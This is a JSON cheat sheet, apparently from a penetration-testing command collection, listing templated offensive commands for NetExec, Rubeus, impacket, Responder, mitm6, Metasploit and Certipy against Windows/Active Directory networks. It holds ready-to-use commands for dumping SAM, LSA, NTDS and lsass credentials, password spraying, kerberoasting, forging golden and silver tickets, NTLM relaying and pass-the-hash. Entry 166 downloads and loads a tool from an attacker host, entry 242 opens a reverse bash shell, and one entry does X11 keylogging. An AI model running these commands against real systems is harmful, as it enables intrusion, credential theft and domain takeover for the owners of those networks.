        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 130,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate local groups",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' --local-groups",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 131,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate shares",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' --shares",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 132,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate disks",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' --disks",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 133,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate smb target not signed",
        "command": "nxc smb [ip] --gen-relay-list [smb_targets.txt]",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 134,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - enumerate logged users",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' --loggedon-users",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 135,
        "tool": "NetExec",
        "category": "POST-EXPLOITATION",
        "information": "NetExec - enable wdigest",
        "command": "nxc smb [ip] -u '[user|Administrator]' -p '[password]' --local-auth --wdigest enable",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 136,
        "tool": "NetExec",
        "category": "ATTACK/CONNECT",
        "information": "NetExec - kerberos auth",
        "command": "nxc smb [ip] --kerberos",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 137,
        "tool": "NetExec",
        "category": "POST-EXPLOITATION",
        "information": "NetExec - dump SAM",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --sam",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 138,
        "tool": "NetExec",
        "category": "POST-EXPLOITATION",
        "information": "NetExec - dump LSA",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --lsa",
    },
    {
        "id": 139,
        "tool": "NetExec",
        "category": "POST-EXPLOITATION",
        "information": "NetExec - dump NTDS",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --ntds",
    },
    {
        "id": 140,
        "tool": "NetExec",
        "category": "POST-EXPLOITATION",
        "information": "NetExec - dump lsass",
        "command": "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] -M lsassy",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 141,
        "tool": "NetExec",
        "category": "ATTACK/BRUTEFORCE-SPRAY",
        "information": "NetExec - password spray (user=password)",
        "command": "nxc smb [dc-ip] -u [user.txt] -p [password.txt] --no-bruteforce --continue-on-success",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 142,
        "tool": "NetExec",
        "category": "ATTACK/BRUTEFORCE-SPRAY",
        "information": "NetExec - password spray multiple test",
        "command": "nxc smb [dc-ip] -u [user.txt] -p [password.txt] --continue-on-success",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 143,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - ASREP Roasting enum whitout authentication",
        "command": "nxc ldap [dc-ip] -u [user|user.txt] -p '' --asreproast output.txt",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 144,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - Kerberoasting",
        "command": "nxc ldap [dc-ip] -u [user] -p [password] --kerberoasting output.txt",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 145,
        "tool": "NetExec",
        "category": "RECON",
        "information": "NetExec - Unconstrained delegation",
        "command": "nxc ldap [dc-ip] -u [user] -p [password] --trusted-for-delegation",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 146,
        "tool": "kerbrute",
        "category": "ATTACK/BRUTEFORCE",
        "information": "kerbrute - kerberos user enumeration",
        "command": "kerbrute userenum --dc [dc-ip] -d [domain] [user.txt]",
        "link": "https://github.com/ropnop/kerbrute"
    },
    {
        "id": 147,
        "tool": "nmap",
        "category": "RECON",
        "information": "Nmap - kerberos user enumeration",
        "command": "nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=[domain] [dc-ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 148,
        "tool": "Metasploit - msf",
        "category": "ATTACK/EXPLOIT",
        "information": "Metasploit - kerberos ms14-068",
        "command": "msfconsole -x \"use auxiliary/admin/kerberos/ms14_068_kerberos_checksum\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 149,
        "tool": "Metasploit - msf",
        "category": "RECON",
        "information": "Exploit gpp - Group policy preference (ms14-025)",
        "command": "msfconsole -x \"use scanner/smb/smb_enum_gpp\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 150,
        "tool": "SCShell",
        "category": "ATTACK/CONNECT",
        "information": "Stealthy psexec",
        "command": "python3 scshell.py -service-name [service_name|defragsvc] -hashes :[ntlm_hash] [domain]/[user]@[ip]",
        "link": "https://github.com/Mr-Un1k0d3r/SCShell"
    },
    {
        "id": 151,
        "tool": "coercer",
        "category": "RECON",
        "information": "Coercer - list vulns",
        "command": "coercer.py -d '[domain]' -u '[user]' -p '[password]' --listener [hackerIp] [targetIp]",
        "link": "https://github.com/p0dalirius/Coercer"
    },
    {
        "id": 152,
        "tool": "coercer",
        "category": "RECON",
        "information": "Coercer - webdav",
        "command": "coercer.py -d '[domain]' -u '[user]' -p '[password]' --webdav-host '[responder-machine-name]' [target-ip]",
        "link": "https://github.com/p0dalirius/Coercer"
    },
    {
        "id": 153,
        "tool": "coercer",
        "category": "RECON",
        "information": "Coercer - list vulns many targets",
        "command": "coercer.py -d '[domain]' -u '[user]' -p '[password]' --listener [hacker-ip] --target-file [target-file]",
        "link": "https://github.com/p0dalirius/Coercer"
    },
    {
        "id": 154,
        "tool": "responder",
        "category": "ATTACK/MITM",
        "information": "Responder - Launch",
        "command": "responder -I [interface]",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 155,
        "tool": "responder",
        "category": "RECON",
        "information": "Responder - Launch analyze mode (no poisoning)",
        "command": "responder -I [interface] -A",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 156,
        "tool": "responder",
        "category": "ATTACK/MITM",
        "information": "Responder - Launch with wpad file",
        "command": "respond -I [interface] --wpad",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 157,
        "tool": "responder",
        "category": "UTILS",
        "information": "Responder - http on",
        "command": "sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 158,
        "tool": "responder",
        "category": "UTILS",
        "information": "Responder - http off",
        "command": "sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 159,
        "tool": "responder",
        "category": "UTILS",
        "information": "Responder - smb on",
        "command": "sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 160,
        "tool": "responder",
        "category": "UTILS",
        "information": "Responder - smb off",
        "command": "sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 161,
        "tool": "responder",
        "category": "UTILS",
        "information": "Responder - challenge set",
        "command": "sed -i 's/Challenge =.*$/Challenge = <challenge>/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 162,
        "tool": "responder",
        "category": "UTILS",
        "information": "Responder - challenge reset",
        "command": "sed -i 's/Challenge =.*$/Challenge = /g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 163,
        "tool": "responder",
        "category": "UTILS",
        "information": "multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)",
        "command": "multirelay -t [ip] -u [user1] [user2]",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 164,
        "tool": "responder",
        "category": "UTILS",
        "information": "multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)",
        "command": "multirelay -t [ip] -u all",
        "link": "https://github.com/lgandx/Responder"
    },
    {
        "id": 165,
        "tool": "rubeus",
        "category":"UTILS",
        "information": "Rubeus - inject ticket from file",
        "command": "Rubeus.exe ptt /ticket:<ticket>",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 166,
        "tool": "rubeus",
        "category":"UTILS",
        "information": "Rubeus - load from powershell",
        "command": "$data = (New-Object System.Net.WebClient).DownloadData('http://[lhost]/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 167,
        "tool": "rubeus",
        "category":"UTILS",
        "information": "Rubeus - execute from powershell",
        "command": "[Rubeus.Program]::MainString(\"klist\");",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 168,
        "tool": "rubeus",
        "category":"ATTACK/EXPLOIT",
        "information": "Rubeus - monitor",
        "command": "Rubeus.exe monitor /interval:5 /filteruser:[machine_account]",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 169,
        "tool": "rubeus",
        "category":"UTILS",
        "information": "Rubeus - inject ticket from b64 blob",
        "command": "Rubeus.exe ptt /ticket:<base64_ticket>",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 170,
        "tool": "rubeus",
        "category":"ATTACK/EXPLOIT",
        "information": "Rubeus - ASREP Roasting for all users in current domain",
        "command": "Rubeus.exe asreproast /format:[AS_REP_response_format] /outfile:hashes.txt",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 171,
        "tool": "rubeus",
        "category":"ATTACK/EXPLOIT",
        "information": "Rubeus - ASREP Roasting for a specific user",
        "command": "Rubeus.exe asreproast /user:[username] /domain:[domain] /format:[AS_REP_response_format] /outfile:hashes.txt",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 172,
        "tool": "rubeus",
        "category":"ATTACK/EXPLOIT",
        "information": "Rubeus - Kerberoasting current domain",
        "command": "Rubeus.exe kerberoast /outfile:hashes.txt [/rc4opsec] [/aes]",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 173,
        "tool": "rubeus",
        "category":"ATTACK/EXPLOIT",
        "information": "Rubeus - Kerberoasting specific user",
        "command": "Rubeus.exe kerberoast /user:[username] /domain:[domain] /outfile:hashes.txt /simple",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 174,
        "tool": "rubeus",
        "category":"POST-EXPLOITATION",
        "information": "Rubeus - get hash from user",
        "command": "Rubeus.exe hash /user:[username] /domain:[domain] /password:[password]",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 175,
        "tool": "rubeus",
        "category":"POST-EXPLOITATION",
        "information": "Rubeus - dump tickets",
        "command": "Rubeus.exe dump",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 176,
        "tool": "rubeus",
        "category":"ATTACK/CONNECT",
        "information": "Rubeus - ask and inject ticket",
        "command": "Rubeus.exe asktgt /user:[username] /domain:[domain] /rc4:[ntlm-hash] /ptt",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 178,
        "tool": "rubeus",
        "category":"ATTACK/EXPLOIT",
        "information": "Rubeus - S4U with ticket constrained delegation",
        "command": "Rubeus.exe s4u /ticket:[ticket] /impersonateuser:[user] /msdsspn:ldap/[domain_fqdn] /altservice:cifs /ptt",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 179,
        "tool": "rubeus",
        "category":"ATTACK/EXPLOIT",
        "information": "Rubeus - S4U with hash constrained delegation",
        "command": "Rubeus.exe s4u /user:[user] /rc4:[ntlm-hash] /impersonateuser:[user] /msdsspn:ldap/[domain_fqdn] /altservice:cifs /domain:[domain_fqdn] /ptt",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 180,
        "tool": "rubeus",
        "category":"POST-EXPLOITATION",
        "information": "Rubeus - get rc4 of machine with the password",
        "command": "Rubeus.exe hash /password:[password]",
        "link": "https://github.com/GhostPack/Rubeus"
    },
    {
        "id": 181,
        "tool": "Metasploit - msf",
        "category":"POST-EXPLOITATION",
        "information": "Metasploit - get laps password",
        "command": "msfconsole -x \"use post/windows/gather/credentials/laps; set session [session_id]; run\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 182,
        "tool": "mitm6",
        "category":"ATTACK/MITM",
        "information": "mitm6 - launch (to run with impacket-ntlmrelayx)",
        "command": "mitm6 -d [domain]",
        "link": "https://github.com/dirkjanm/mitm6"
    },
    {
        "id": 183,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "psexec with username",
        "command": "psexec.py [domain]/[user]:[password]@[ip]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 184,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "psexec with pass the hash",
        "command": "psexec.py -hashes [hash] [user]@[ip]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 185,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "psexec with kerberos",
        "command": "export KRB5CCNAME=[ccache_file]; psexec.py -dc-ip [dc_ip] -target-ip [ip] -no-pass -k [domain]/[user]@[target_name]",
        "link": "https://github.com/fortra/impacket",
    },
    {
        "id": 186,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "smbexec with username",
        "command": "smbexec.py [domain]/[user]:[password]@[ip]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 187,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "smbexec with pass the hash",
        "command": "smbexec.py -hashes [hash] [user]@[ip]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 188,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "smbexec with kerberos",
        "command": "export KRB5CCNAME=[ccache_file]; smbexec.py -dc-ip [dc_ip] -target-ip [ip] -no-pass -k [domain]/[user]@[target_name]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 189,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "wmiexec with username",
        "command": "wmiexec.py [domain]/[user]:[password]@[ip]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 190,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "wmiexec with pass the hash",
        "command": "wmiexec.py -hashes [hash] [user]@[ip]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 191,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "atexec - execute command view the task scheduler",
        "command": "atexec.py [domain]/[user]:[password]@[ip] \"[command]\"",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 192,
        "tool": "impacket",
        "category":"ATTACK/CONNECT",
        "information": "atexec - execute command view the task scheduler with pass the hash",
        "command": "atexec.py -hashes [hash] [user]@[ip] \"[command]\"",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 193,
        "tool": "impacket",
        "category":"POST-EXPLOITATION",
        "information": "secretsdump - dump hashes",
        "command": "secretsdump.py [domain]/[user]:[password]@[ip]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 194,
        "tool": "impacket",
        "category":"POST-EXPLOITATION",
        "information": "secretsdump - local dump extract hashes from sam database",
        "command": "secretsdump.py -system [system_file|SYSTEM] -sam [sam_file|SAM] local",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 195,
        "tool": "impacket",
        "category":"POST-EXPLOITATION",
        "information": "secretsdump - local dump extract hashes from ntds database",
        "command": "secretsdump.py -ntds [ntds_file|NTDS.dit] -system [system_file|SYSTEM] -hashes [lmhash:nthash] local -outputfile [output_file]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 196,
        "tool": "impacket",
        "category":"POST-EXPLOITATION",
        "information": "secretsdump - anonymous get administrator",
        "command": "secretsdump.py [domain]/[dc_bios_name]\\$/@[ip] -no-pass -just-dc-user \"Administrator\"",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 197,
        "tool": "impacket",
        "category":"POST-EXPLOITATION",
        "information": "secretsdump - remote extract",
        "command": "secretsdump.py -just-dc-ntlm -outputfile [output_file] [domain]/[user]:[password]@[ip]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 198,
        "tool": "impacket",
        "category":"POST-EXPLOITATION",
        "information": "secretsdump - remote extract and user info",
        "command": "secretsdump.py -just-dc -pwd-last-set -user-status -outputfile [output_file] [domain]/[user]:[password]@[ip]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 199,
        "tool": "impacket",
        "category":"ATTACK/MITM",
        "information": "ntlmrelay - host a payload that will be served to the remote target when connecting",
        "command": "ntlmrelayx.py -tf targets.txt -smb2support -e [payload]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 200,
        "tool": "impacket",
        "category":"ATTACK/MITM",
        "information": "ntlmrelay - socks",
        "command": "ntlmrelayx.py -tf targets.txt -socks -smb2support",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 201,
        "tool": "impacket",
        "category":"ATTACK/MITM",
        "information": "ntlmrelay - authenticate and dump hash",
        "command": "ntlmrelayx.py -tf targets.txt -smb2support",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 202,
        "tool": "impacket",
        "category":"ATTACK/MITM",
        "information": "ntlmrelay - to use with mitm6 - relay to target",
        "command": "ntlmrelayx.py -6 -wh [attacker_ip] -t smb://[target] -l /tmp -socks -debug",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 203,
        "tool": "impacket",
        "category":"ATTACK/MITM",
        "information": "ntlmrelay - to use with mitm6 - delegate access",
        "command": "ntlmrelayx.py -t ldaps://[dc_ip] -wh [attacker_ip] --delegate-access",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 204,
        "tool": "impacket",
        "category":"ATTACK/EXPLOIT",
        "information": "GetNPUsers - without password to get TGT (ASREPRoasting)",
        "command": "GetNPUsers.py [domain]/[user] -no-pass -request -format hashcat",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 205,
        "tool": "impacket",
        "category":"ATTACK/EXPLOIT",
        "information": "GetNPUsers - attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' (ASREPRoasting)",
        "command": "GetNPUsers.py -dc-ip [dc_ip] [domain]/ -usersfile [users_file] -format hashcat",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 206,
        "tool": "impacket",
        "category":"ATTACK/EXPLOIT", 
        "information": "GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)",
        "command": "GetUserSPNs.py -request -dc-ip [dc_ip] [domain]/[user]:[password]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 207,
        "tool": "impacket",
        "category":"ATTACK/EXPLOIT",
        "information": "MS14-068 - goldenPac",
        "command": "goldenPac.py -dc-ip [dc_ip] [domain]/[user]:'[password]'@[target]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 208,
        "tool": "impacket",
        "category":"ATTACK/EXPLOIT",
        "information": "Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.",
        "command": "ticketer.py -nthash [ntlm_hash] -domain-sid [domain_sid] -domain [domain] -user [user]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 209,
        "tool": "impacket",
        "category":"ATTACK/EXPLOIT",
        "information": "Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.",
        "command": "ticketer.py -nthash [ntlm_hash] -domain-sid [domain_sid] -domain [domain] -spn [spn] [user]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 210,
        "tool": "impacket",
        "category":"ATTACK/EXPLOIT",
        "information": "Silver ticket - impersonate user",
        "command": "getST.py -spn cifs/[target] [domain]/[netbios_name]\\$ -impersonate [user]",
        "link": "https://github.com/fortra/impacket"
    },
    {
        "id": 211,
        "tool": "ntfs",
        "category":"RECON",
        "information": "ntfs - showmount",
        "command": "showmount -e [ip]",
    },
    {
        "id": 212,
        "tool": "nmap",
        "category":"RECON",
        "information": "Nmap - showmount",
        "command": "nmap -sV --script=nfs-showmount [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 213,
        "tool": "ntfs",
        "category":"ATTACK/CONNECT",
        "information": "ntfs - mount",
        "command": "mount -t nfs [ip]:[path] [local_path] -o nolock"
    },
    {
        "id": 214,
        "tool": "ntfs",
        "category":"ATTACK/CONNECT",
        "information": "ntfs - mount with v2 (no authenrt)",
        "command": "mount -t nfs -o vers=2 [ip]:[path] [local_path] -o nolock"
    },
    {
        "id": 215,
        "tool": "nmap",
        "category":"RECON",
        "information": "VNC - nmap enum",
        "command": "nmap -sV -p [port|5900] --script=realvnc-auth-bypass,vnc-info,vnc-title [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 216,
        "tool": "VNC",
        "category":"UTILS",
        "information": "VNC - decrypt vnc.ini password",
        "command": "echo -n <password> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv",
    },
    {
        "id": 217,
        "tool": "Metasploit - msf",
        "category":"ATTACK/CONNECT",
        "information": "Metasploit - vnc test none auth",
        "command": "msfconsole -x \"use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS [ip]; set RPORT [port]; run\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 218,
        "tool": "Metasploit - msf",
        "category":"POST-EXPLOITATION",
        "information": "Metasploit - vnc retrieve credentials",
        "command": "msfconsole -x \"use post/windows/gather/credentials/vnc; set SESSION <session>; run\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 219,
        "tool": "DNS",
        "category":"RECON",
        "information": "Host find name server",
        "command": "host -t ns [domain]",
    },
    {
        "id": 220,
        "tool": "DNS",
        "category":"RECON",
        "information": "Host find mail server",
        "command": "host -t mx [domain]",
    },
    {
        "id": 221,
        "tool": "DNS",
        "category":"RECON",
        "information": "Dig dns lookup",
        "command": "dig [domain] @1.1.1.1",
    },
    {
        "id": 222,
        "tool": "DNS",
        "category":"RECON",
        "information": "Dig any information",
        "command": "dig any [domain] @[IP_DNS]",
    },
    {
        "id": 223,
        "tool": "DNS",
        "category":"RECON",
        "information": "Dig zone transfer",
        "command": "dig axfr @[IP_DNS] [domain]",
    },
    {
        "id": 224,
        "tool": "DNS",
        "category":"RECON",
        "information": "Dig reverse lookup",
        "command": "dig -x [ip] @[IP_DNS]",
    },
    {
        "id": 225,
        "tool": "DNS",
        "category":"RECON",
        "information": "dnsrecon standard enumeration on domain",
        "command": "dnsrecon -d [domain]",
        "link": "https://github.com/darkoperator/dnsrecon"
    },
    {
        "id": 226,
        "tool": "DNS",
        "category":"RECON",
        "information": "dnsrecon zone transfer",
        "command": "dnsrecon -d [domain] -t axfr",
        "link": "https://github.com/darkoperator/dnsrecon"
    },
    {
        "id": 227,
        "tool": "DNS",
        "category":"RECON",
        "information": "dns sublist3r - subdomain enumeration",
        "command": "sublist3r -d [domain] -v",
        "link": "https://github.com/aboul3la/Sublist3r"
    },
    {
        "id": 228,
        "tool": "DNS",
        "category":"RECON",
        "information": "dns sublist3r - subdomain enumeration with bruteforce",
        "command": "sublist3r -d [domain] -b -v",
        "link": "https://github.com/aboul3la/Sublist3r"
    },
    {
        "id": 229,
        "tool": "nmap",
        "category":"RECON",
        "information": "mssql - enum",
        "command": "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p [port|1433] [IP]",
        "link": "https://nmap.org/"
    },
    {
        "id": 230,
        "tool": "Metasploit - msf",
        "category":"ATTACK/BRUTEFORCE",
        "information": "Metasploit - enum mssql login",
        "command": "msfconsole -x \"use admin/mssql/mssql_enum_sql_logins; set RHOSTS [ip]; set USER_FILE [user_file]; set PASS_FILE [pass_file]; run\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 231,
        "tool": "Metasploit - msf",
        "category":"RECON",
        "information": "Metasploit - enum mssql configuration setting (xp-cmdshell)",
        "command": "msfconsole -x \"use auxiliary/admin/mssql/mssql_enum; set RHOST [ip]; set password [password]; run\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 232,
        "tool": "Metasploit - msf",
        "category":"ATTACK/EXPLOIT",
        "information": "Metasploit - mssql link crawler",
        "command": "msfconsole -x \"use exploit/windows/mssql/mssql_linkcrawler\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 233,
        "tool": "netbios",
        "category":"RECON",
        "information": "nbtscan - scan netbios",
        "command": "nbtscan -r [ip_range]",
        "link": "https://github.com/charlesroelli/nbtscan"
    },
    {
        "id": 234,
        "tool": "windows RDP",
        "category":"POST-EXPLOITATION",
        "information": "enable RDP",
        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
    },
    {
        "id": 235,
        "tool": "nmap",
        "category":"RECON",
        "information": "nmap - pop3 infos",
        "command": "nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -port [port] [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 236,
        "tool": "nmap",
        "category":"RECON",
        "information": "nmap - mysql enumeration",
        "command": "nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 237,
        "tool": "nmap",
        "category":"ATTACK/CONNECT",
        "information": "nmap - FTP enum anonym",
        "command": "nmap --script ftp-anon -p 21 [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 238,
        "tool": "Metasploit - msf",
        "category":"ATTACK/BRUTEFORCE",
        "information": "Metasploit - FTP bruteforce login",
        "command": "msfconsole -x \"use auxiliary/scanner/ftp/ftp_login; set RHOSTS [ip]; set USER_FILE [user_file]; set PASS_FILE [password_file]; exploit\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 239,
        "tool": "nmap",
        "category":"ATTACK/CONNECT",
        "information": "nmap - x11 check anonymous connection",
        "command": "nmap --script x11-access -p 6000-6063 -sV [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 240,
        "tool": "X11",
        "category":"ATTACK/EXPLOIT",
        "information": "X11 - keylogging",
        "command": "xspy [ip]",
        "link": "https://github.com/mnp/xspy"
    },
    {
        "id": 241,
        "tool": "X11",
        "category":"ATTACK/CONNECT",
        "information": "X11 - remote desktop view",
        "command": "xrdp  [IP]:[Display]",
        "link": "https://github.com/neutrinolabs/xrdp"
    },
    {
        "id": 242,
        "tool": "Metasploit - msf",
        "category":"ATTACK/EXPLOIT",
        "information": "Metasploit - x11 reverse shell",
        "command": "msfconsole -x \"use exploit/unix/x11/x11_keyboard_exec; set RHOST [ip]; set payload cmd/unix/reverse_bash; set lhost <lhost>; set lport <lport>; exploit\"",
        "link": "https://www.metasploit.com/"
    },
    {
        "id": 243,
        "tool": "nmap",
        "category":"RECON",
        "information": "nmap - snmp scan",
        "command": "nmap -sU -p 161 -sC --open [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": "244",
        "tool": "nmap",
        "category": "ATTACK/BRUTEFORCE",
        "information": "nmap - snmp brute force",
        "command": "nmap -sU -p 161 --script snmp-brute --script-args snmpbrute.communitiesdb=[wordlist] [ip]",
        "link": "https://nmap.org/"
    },
    {
        "id": 245,
        "tool": "SSH",
        "category":"PIVOTING",
        "information": "SSH - dynamic port forwarding over socks",
        "command": "ssh -D [local_port] [user]@[ip]",
    },
    {
        "id": 246,
        "tool": "SSH",
        "category":"PIVOTING",
        "information": "SSH - port forwarding",
        "command": "ssh -L [local_port]:[remote_ip]:[remote_port] [user]@[ip]",
    },
    {
        "id": 247,
        "tool": "NetExec",
        "category":"RECON",
        "information": "Find PKI in Active Directory and Certificate Templates Names",
        "command": "nxc ldap [ip] -u [username] -p [password] -M adcs",
        "link": "https://github.com/Pennyw0rth/NetExec"
    },
    {
        "id": 248,
        "tool": "Certipy",
        "category": "RECON",
        "information": "Search for vulnerable certificate templates",
        "command": "certipy find -u [username] -p [password] -dc-ip [dc_ip] -vulnerable -enabled",
        "link": "https://github.com/ly4k/Certipy"
    },
    {
        "id": 249,
        "tool": "Certipy",
        "category": "RECON",
        "information": "List CAs, servers and search for vulnerable certificate templates",
        "command": "certipy find -u [username] -p [password] -dc-ip [ip] -dns-tcp -ns [ip] -debug",
        "link": "https://github.com/ly4k/Certipy"
    },
    {
        "id": 250,
        "tool": "Certify",
        "category": "RECON",
        "information": "Search for vulnerable certificate templates",
        "command": "certify.exe find /vulnerable",
